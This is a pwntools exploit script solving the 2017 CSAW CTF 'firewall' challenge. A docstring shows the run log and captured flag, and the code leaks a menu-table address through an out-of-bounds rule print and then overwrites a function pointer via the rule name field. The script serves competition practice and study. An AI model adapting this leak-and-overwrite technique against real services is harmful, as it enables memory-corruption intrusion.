#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
expl:~/ctf/2017/csaw/firewall$ python sol.py
[+] Opening connection to firewall.chal.csaw.io on port 4141: Done
00000000  7c 20 46 49  52 45 57 41  4c 4c 20 52  55 4c 45 20  │| FI│REWA│LL R│ULE │
00000010  23 34 32 39  34 39 36 37  32 39 35 0a  7c 20 2d 20  │#429│4967│295·│| - │
00000020  4e 61 6d 65  3a 20 f1 26  01 68 f1 26  01 84 f1 26  │Name│: ·&│·h·&│···&│
00000030  01 a0 f1 26  01 bc f1 26  01 d8 f1 26  01 f4 f1 26  │···&│···&│···&│···&│
00000040  01 01 41 0a  7c 20 2d 20  50 6f 72 74  3a 20 32 39  │··A·│| - │Port│: 29│
00000050  34 0a 7c 20  2d 20 54 79  70 65 3a 20  f4 f1 26 01  │4·| │- Ty│pe: │··&·│
00000060  01 41 0a 7c  20 50 52 45  53 53 20 45  4e 54 45 52  │·A·|│ PRE│SS E│NTER│
00000070  20 54 4f 20  52 45 54 55  52 4e 20 54  4f 20 4d 45  │ TO │RETU│RN T│O ME│
00000080  4e 55                                               │NU│
00000082
menu_located at: 0x126f168
[*] Switching to interactive mode
| INVALID RULE TYPE! CANCELING CREATION...
| PRESS ENTER TO RETURN TO MENU 
| +-------------------------+
| |- MENU                   |
| +-------------------------+
| | 1. add firewall rule    |
| | 2. edit firewall rule   |
| w3_f3ll_pr3tty_f4r_d0wn_th3_w1nd0ws_r4bb1t_h0le_huh
| (null)
| (null)
| (null)
| (null)
| (null)
| +-------------------------+
| MENU SELECTION: $ 8
$
[*] Got EOF while reading in interactive
$
[*] Closed connection to firewall.chal.csaw.io port 4141
[*] Got EOF while sending in interactive
"""

from pwn import *

r = remote("firewall.chal.csaw.io", 4141)
#r = remote("192.168.21.102", 8888)
r.sendlineafter("TOKEN: ", "352762356")

# Create first rule
r.sendlineafter("SELECTION: ", "1")
r.sendlineafter("NAME: ", "A")
r.sendlineafter("PORT: ", "40")
r.sendlineafter("TYPE: ", "TCP")
r.sendline("")

# leak address of menu
r.sendlineafter("SELECTION: ", "4")
r.sendlineafter("PRINT: ", "0")
r.sendline("")

leak = r.recvuntil("TO MENU")
print hexdump(leak)

l = u32(leak[0x29:0x29+4])
flag_loc = l + 0x39c9
print "menu_located at:", hex(l)

# overwrite one of menu table addr
r.sendlineafter("SELECTION: ", "2")
r.sendlineafter("EDIT: ", "0")

#raw_input("$ ")

r.sendlineafter("NAME: ", p32(l)[1:] + p32(flag_loc))
r.sendlineafter("PORT: ", "0")
r.sendlineafter("TYPE: ", "")

r.sendline("")

r.interactive()
r.close()
